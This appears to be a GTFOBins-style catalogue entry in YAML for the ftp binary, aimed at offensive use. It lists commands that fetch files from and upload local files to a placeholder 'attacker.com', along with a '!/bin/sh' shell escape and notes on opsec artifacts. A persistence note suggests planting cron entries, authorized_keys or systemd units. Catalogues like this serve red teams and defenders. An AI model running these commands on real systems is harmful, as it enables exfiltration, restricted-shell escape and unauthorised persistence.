---
name: ftp
capabilities:
- exec
- spawn
- upload
- download
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: |-
    ftp -a attacker.com
    get /path/to/input-file output-file
  notes: Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    ftp
    !/bin/sh
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: |-
    ftp -a attacker.com
    put /path/to/input-file output-file
  notes: Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.
references:
- https://gtfobins.github.io/gtfobins/ftp/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
